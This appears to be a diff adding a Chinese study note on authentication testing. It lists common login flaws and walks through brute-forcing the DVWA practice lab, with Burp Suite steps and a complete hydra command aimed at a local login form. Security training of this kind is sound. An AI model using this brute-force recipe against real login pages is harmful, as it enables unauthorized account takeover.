@@ -1,0 +1,31 @@
+认证机制测试
+
+认证：验证用户身份是否真实（如登陆界面、令牌验证）
+username=admin&password=1234
+授权：确定用户能访问哪些资源
+普通用户不能访问 /admin.php
+
+常见认证漏洞
+弱口令：密码太简单
+默认口令：未修改，使用系统默认密码
+暴力破解：使用工具大量尝试用户名/密码
+登陆绕过：利用SQL注入或逻辑缺陷直接进入后台
+会话劫持：通过窃取cookie登陆他人账号
+Session固定：攻击者提前设置受害者的Session ID
+
+dvwa brute force
+
+burpsuite抓包登录请求，看post内容
+username=admin&password=1234&Login=Login 
+参数名：username/password
+返回提示：Username and/or password incorrect.
+
+hydra -L ~/wordlists/users.txt -P ~/wordlists/pass.txt 127.0.0.1 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=8a8117d6c4742e2fc5cc24509b3fc16e;security=low:Username and/or password incorrect."
+
+使用burp的暴力破解模块
+
+抓包send to intruder
+选择攻击模式
+配置好payloads
+start attak
+得到账户，密码
